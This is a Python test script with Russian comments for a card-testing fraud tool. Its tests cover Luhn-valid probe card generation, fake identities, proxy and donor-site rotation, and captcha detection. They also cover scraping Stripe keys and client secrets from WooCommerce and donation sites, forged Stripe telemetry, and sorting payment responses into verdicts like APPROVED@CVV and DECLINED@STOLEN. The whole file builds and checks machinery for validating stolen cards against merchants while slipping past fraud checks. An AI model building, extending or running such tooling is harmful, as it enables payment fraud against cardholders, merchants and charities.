import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))  # корень проекта при любом cwd

import os
import gate_client as gc

cards = [gc.gen_probe_card() for _ in range(50)]
assert all(gc.check_luhn(c['number']) and len(c['number']) == 16 for c in cards), 'luhn gen broken'
print('probe_cards: 50/50 Luhn-valid, sample:', cards[0]['number'])

ident = gc.random_identity()
print('identity:', ident['email'], '|', ident['username'], '|', ident['city'], ident['state'], ident['postal_code'])

html = '''<form class="woocommerce-form woocommerce-form-register register">
<input type="hidden" id="woocommerce-register-nonce" name="woocommerce-register-nonce" value="a1b2c3d4e5" />
<input type="hidden" name="wcap_atc_token" value="tok123" /></form>'''
pm = 'pk_live_51ABCDEFghijklmnopQRstu ... createAndConfirmSetupIntentNonce: "deadbeef01"'

body0 = {}
print('reg_nonce:', gc.extract_reg_nonce(html))
print('honeypot:', gc.extract_honeypot_fields(gc.extract_register_form_html(html), body0))
print('scrape:', gc.scrape_gate(pm))
print('verdicts:', gc.classify_verdict('This card has Insufficient funds.'), '/', gc.classify_verdict('Your card was declined.'))
assert gc.classify_verdict('card was stolen') == 'DECLINED@STOLEN'
assert gc.classify_verdict('blocked by fraud rules') == 'DECLINED@FRAUD'
assert gc.classify_verdict('do_not_honor') == 'DECLINED@DO_NOT_HONOR'
assert gc.classify_verdict('incorrect_number') == 'INVALID'
assert gc.classify_verdict('please try again later') == 'RETRY'
print('nonce_reject:', gc.is_nonce_rejection({'data': '-1'}), gc.is_nonce_rejection({'success': False, 'message': 'Invalid nonce'}))

# --- Пакет 1/2/4: mask, cvc-gen, proxy pool, captcha/backoff ---
assert gc.mask_pan('5175465382242090|09|2030|018') == '517546******2090'
pc = gc.parse_card('4111111111111111|12|29')
assert pc['cvc'].isdigit() and len(pc['cvc']) == 3, 'cvc generation broken'
assert gc.parse_card('4111111111111111|12|29|777')['cvc'] == '777', 'explicit cvc lost'
print('mask_pan OK | cvc-gen:', pc['cvc'])

assert gc.load_proxies('data/__no_such__.txt') == []
assert gc.pick_proxy(None, None) is None
p = gc.pick_proxy(['1.2.3.4:8080'], None)
assert p.startswith('http://'), p
assert gc.pick_proxy(None, 'socks5://u:p@5.6.7.8:1080') == 'socks5://u:p@5.6.7.8:1080'
assert gc.pick_proxy(None, '9.9.9.9:3128') == 'http://9.9.9.9:3128'
print('proxy pool OK:', p)

assert gc.looks_like_captcha('<html>Sorry, anomaly detected</html>') is True
assert gc.looks_like_captcha('<html>10 results</html>') is False
print('captcha detect OK')

import asyncio
asyncio.run(gc.backoff_sleep(0, base=0.05))
asyncio.run(gc.polite_delay(0.01, 0.01))
print('backoff/polite OK')

# --- Спринт 1: гео-пулы, cookies, hcaptcha-поле, атрибуция, ctoken ---
for cc in ('GB', 'AU', 'CA', 'DE', 'FR', 'XX', ''):
    gi = gc.geo_identity_fields(cc)
    assert gi['country'] in gc.GEO_POOLS or gi['country'] == 'US', (cc, gi)
    assert gi['city'] and gi['postal_code'], gi
assert gc.geo_identity_fields('GB')['country'] == 'GB'
assert gc.geo_identity_fields('XX')['country'] == 'US', 'fallback broken'
gb = gc.random_identity('GB')
assert gb['country'] == 'GB' and gb['postal_code'] == gb['postal_code']
print('geo pools OK:', {k: len(v) for k, v in gc.GEO_POOLS.items()}, '| GB sample:', gb['city'], gb['postal_code'])

sc = gc.parse_stripe_cookies([
    '__stripe_mid=abc123def; Path=/; Domain=.stripe.com; Secure',
    '__stripe_sid=987zyx; Path=/; Domain=.stripe.com; HttpOnly',
])
assert sc == {'mid': 'abc123def', 'sid': '987zyx'}, sc
sc2 = gc.parse_stripe_cookies(['other=x'])
assert sc2 == {'mid': '', 'sid': ''}
sc3 = gc.parse_stripe_cookies(None)
assert sc3 == {'mid': '', 'sid': ''}
print('parse_stripe_cookies OK:', sc)

msr = gc.parse_m_stripe_response({"muid": "b98b62cd-942f-4774-9b72-66a20cea61ac3a8d50",
                                  "guid": "f7a317bd-9059-44f2-aa8c-9de0c74387559c1e7e",
                                  "sid": "a2629cba", "noise": 5})
assert msr["muid"].endswith("3a8d50") and len(msr["muid"]) == 42
assert msr["guid"] != "" and msr["sid"] == "", 'short sid must be rejected'
assert gc.parse_m_stripe_response(None) == {"muid": "", "sid": "", "guid": ""}
assert gc.parse_m_stripe_response({}) == {"muid": "", "sid": "", "guid": ""}
pl = gc.m_stripe_beacon_payload()
assert pl["v"] == "t" and len(pl["guid"].split("-")) == 5
print('parse_m_stripe_response OK:', msr['muid'][-10:], '| beacon payload OK')

t_us = gc.stripe_telemetry('https://d.com', 'pk_live_x')
t_gb = gc.stripe_telemetry('https://d.com', 'pk_live_x', country_code='GB',
                           muid='LIVEMID', sid='LIVESID')
assert t_us['muid'] != '' and len(t_us['muid'].split('-')) == 5, 'uuid4 fallback lost'
assert t_gb['muid'] == 'LIVEMID' and t_gb['sid'] == 'LIVESID'
assert t_gb['country'] == 'GB' and t_gb['guid'] != t_us['guid']
print('telemetry OK: uuid4-fallback + live muid/sid + geo')

card_t = {'number': '4111111111111111', 'month': '12', 'year': '2029', 'cvc': '123'}
b_plain = gc.tokenize_body(card_t, t_us, 'https://d.com')
assert 'radar_options[hcaptcha_token]' not in b_plain
t_hc = dict(t_us)
t_hc['_hcaptcha_token'] = 'P1_eyJ...'
b_hc = gc.tokenize_body(card_t, t_hc, 'https://d.com')
assert b_hc['radar_options[hcaptcha_token]'] == 'P1_eyJ...'
assert b_hc['billing_details[address][country]'] == 'US'
b_gb = gc.tokenize_body(card_t, t_gb, 'https://d.com')
assert b_gb['billing_details[address][postal_code]'] == t_gb['postal_code']
print('tokenize OK: radar_options only with token; geo billing passes through')

attr = gc.wc_attribution_fields('https://www.donor.example/')
assert attr['wc_order_attribution_source_type'] == 'organic'
assert attr['wc_order_attribution_session_entry'].endswith('/my-account/add-payment-method/')
assert attr['wc_order_attribution_session_pages'] == '2'
assert len(attr) == 11, len(attr)
print('wc_attribution OK: 11 fields, entry url derived')

ct_html = '''var confirmationTokenNonce = "ct_abc123"; id: ctoken_1NnQUf2eZvKYlo2CIObdtbnb'''
sg = gc.scrape_gate(pm + ct_html)
assert sg['ctoken_nonce'] == 'ct_abc123', sg
assert sg['ctoken_id'].startswith('ctoken_'), sg
sg_old = gc.scrape_gate(pm)
assert sg_old['ctoken_nonce'] == '' and sg_old['upe_nonce'] == 'deadbeef01'
print('ctoken groundwork OK:', sg['ctoken_nonce'], sg['ctoken_id'])

# --- Спринт 2: скоринг/ротация доноров, sticky-пул прокси ---
pool_t = [
    {"domain": "good", "success_rate": 0.9, "latency_avg_ms": 800},
    {"domain": "slow", "success_rate": 0.9, "latency_avg_ms": 9000},
    {"domain": "captcha", "success_rate": 0.9, "latency_avg_ms": 800, "captcha_on_add_card": True},
    {"domain": "failing", "success_rate": 0.9, "latency_avg_ms": 800, "fail_count": 2},
]
w = {g['domain']: gc.score_gate(g) for g in pool_t}
assert w['good'] > w['slow'] > w['failing'], w
assert w['good'] > w['captcha'] * 5, 'captcha penalty too weak'
orders = [tuple(g['domain'] for g in gc.pick_gate_order(pool_t)) for _ in range(30)]
assert all(set(o) == {'good', 'slow', 'captcha', 'failing'} for o in orders), 'order loses donors'
assert len(set(orders)) > 1, 'rotation is deterministic'
print('score_gate/pick_gate_order OK:', {k: round(v, 6) for k, v in w.items()})

from proxy_manager import ProxyPool
pp = ProxyPool(['http://1.1.1.1:80', 'http://2.2.2.2:80'])
p1 = pp.pick('donor-x'); p2 = pp.pick('donor-x')
assert p1 == p2, 'sticky broken'
assert pp.pick() in ('http://1.1.1.1:80', 'http://2.2.2.2:80')
pp.mark_bad(p1)  # fail_count=1 — ещё жив
assert pp.pick('donor-x') is not None
for _ in range(3):
    pp.mark_bad(p1)   # добиваем до alive=False и снимаем sticky
assert pp._sticky.get('donor-x') != p1, 'sticky not released after death'
print('proxy pool sticky/mark_bad OK')

# --- Спринт 2: SQLite-хранилище доменов (roundtrip на живом db с очисткой) ---
import domains_store
import sqlite3 as _sq
domains_store.init_db()
test_dom = 'zz-sprint2-test.example'
with _sq.connect(domains_store.DB_PATH) as c:  # идемпотентность: остатки прошлых прогонов
    c.execute('DELETE FROM domains WHERE domain=?', (test_dom,))
n_added = domains_store.upsert([test_dom, test_dom], source='dork', priority=3)
assert n_added == 1, 'dedupe broken'
n_up = domains_store.upsert([test_dom], source='forum', priority=1)
assert n_up == 0, 're-insert must be ignored'
with _sq.connect(domains_store.DB_PATH) as c:
    row = c.execute('SELECT source, priority FROM domains WHERE domain=?', (test_dom,)).fetchone()
# источник/first_seen приклеиваются при первой вставке; приоритет улучшается до лучшей полосы (MIN)
assert row[0] == 'dork' and row[1] == 1, f'source sticks, best-lane priority wins: {row}'
due = domains_store.due_for_scan(hours=24)
assert any(r['domain'] == test_dom for r in due), 'fresh insert must be due'
domains_store.mark_scanned(test_dom, 'READY')
due2 = domains_store.due_for_scan(hours=24)
assert not any(r['domain'] == test_dom for r in due2), 'scanned must leave queue'
st = domains_store.stats()
assert st['total'] >= 1
txt_path = 'data/_sprint2_export_test.txt'
n_exp = domains_store.export_txt(txt_path)
assert n_exp >= st['total']
os.remove(txt_path)
with _sq.connect(domains_store.DB_PATH) as c:
    c.execute('DELETE FROM domains WHERE domain=?', (test_dom,))
print(f"domains_store roundtrip OK: total={st['total']} sources={st['by_source']} pending={st['pending']}")

# --- Спринт 3: extract_client_secrets (5 векторов) + detect_secret_mints ---
SEC = 'pi_3Nabc123XYZ_secret_def456ghi789JKL'
cs_html = f'''<div data-client-secret="{SEC}"></div>
<script>var stripeClientSecret = "{SEC}";</script>
<a href="/pay?payment_intent_client_secret={SEC}">x</a>
<script type="application/json">{{"clientSecret":"{SEC}"}}</script>
<meta name="stripe-client-secret" content="{SEC}">'''
secs = gc.extract_client_secrets(cs_html)
assert len(secs) == 1, f'same secret must dedupe, got {len(secs)}'
assert secs[0]['source'] == 'data-attr' and secs[0]['pi_id'] == 'pi_3Nabc123XYZ'
SEC2 = 'pi_9Zzz888yyy_secret_qqq777www666'
s2 = gc.extract_client_secrets(f'<meta name="stripe-client-secret" content="{SEC}">"clientSecret":"{SEC2}"')
assert {x['secret'] for x in s2} == {SEC, SEC2}, s2
assert [x['source'] for x in s2 if x['secret'] == SEC] == ['meta']
print('extract_client_secrets OK: 5-vector coverage, dedupe, pi_id split')

mint_html = '''<script>var url = "/?wc-ajax=wc_stripe_create_payment_intent";</script>
<form action="/wp-json/wc/store/v1/checkout">
<a href="https://x.com/admin-ajax.php?action=give_process_donation">
<script>fetch("/api/create-payment-intent", {method: "POST"})</script>'''
mints = gc.detect_secret_mints(mint_html, 'https://donor.example')
assert any('wc_stripe_create_payment_intent' in m for m in mints), mints
assert any('wc/store/v1/checkout' in m for m in mints), mints
assert any('give_process_donation' in m for m in mints), mints
assert any(m.endswith('/create-payment-intent') for m in mints), mints
assert gc.detect_secret_mints('<html>nothing here</html>', 'https://x.com') == []
print(f'detect_secret_mints OK: {len(mints)} endpoints from synthetic page')

# --- Спринт 3 core: classify_pi_verdict / pi_secret_alive ---
cases = [
    ({"status": "succeeded", "id": "pi_x"}, "APPROVED", None),
    ({"status": "requires_capture"}, "APPROVED@HOLD", None),
    ({"status": "requires_action",
      "next_action": {"use_stripe_sdk": {"type": "three_d_secure_2_source"}}}, "3DS_REQUIRED", None),
    ({"error": {"type": "card_error", "code": "incorrect_cvc"}}, "APPROVED@CCN", None),
    ({"error": {"type": "card_error", "decline_code": "insufficient_funds"}}, "APPROVED@CVV", None),
    ({"error": {"type": "card_error", "decline_code": "stolen_card"}}, "DECLINED@STOLEN", None),
    ({"error": {"type": "card_error", "decline_code": "do_not_honor"}}, "DECLINED@DO_NOT_HONOR", None),
    ({"error": {"type": "card_error", "code": "expired_card"}}, "EXPIRED", None),
    ({"error": {"type": "invalid_request_error", "code": "testmode_charges_only"}}, "TEST_MODE", None),
    ({"error": {"type": "api_error", "code": "rate_limit_error"}}, "RATE_LIMITED", None),
    ({"error": {"type": "card_error", "code": "processing_error"}}, "RETRY", None),
    ({"error": {"type": "card_error", "code": "incorrect_number"}}, "INVALID", None),
]
for resp, want, _ in cases:
    got, detail = gc.classify_pi_verdict(resp)
    assert got == want, f'{resp} -> {got} != {want}'
print(f'classify_pi_verdict OK: {len(cases)} mappings')
assert gc.pi_secret_alive({"status": "requires_payment_method"}) is True
assert gc.pi_secret_alive({"error": {"type": "card_error"}}) is True
assert gc.pi_secret_alive({"status": "canceled"}) is False
assert gc.pi_secret_alive({"error": {"type": "invalid_request_error"}}) is False
print('pi_secret_alive OK: card_error keeps secret, canceled kills it')

# --- 6.3 таксономия config vs движки ---
import config
assert "WRONG_CVC" in config.VERDICTS and "RESTRICTED" in config.VERDICTS
assert "3DS_FRICTIONLESS" in config.VERDICTS and "PI_MINTED" in config.VERDICTS
assert all(v in config.VERDICTS for v in
           ("APPROVED@PAID", "DECLINED@STOLEN", "INVALID", "RETRY"))
print(f'taxonomy OK: {len(config.VERDICTS)} verdicts, icons complete')

# --- 2.6 token_only_check offline-гварды (без сети: битый pk) ---
async def _t():
    from curl_cffi.requests import AsyncSession
    async with AsyncSession() as s:
        r = await gc.token_only_check(s, "", "4539277623105000|10|2028|276", "https://x.com")
        assert r["status"] == "ERROR", r
        r2 = await gc.token_only_check(s, "pk_test_xxx", "4539277623105000|10|2028|276", "https://x.com")
        assert r2["status"] == "ERROR", r2
asyncio.run(_t())
print('token_only guards OK')
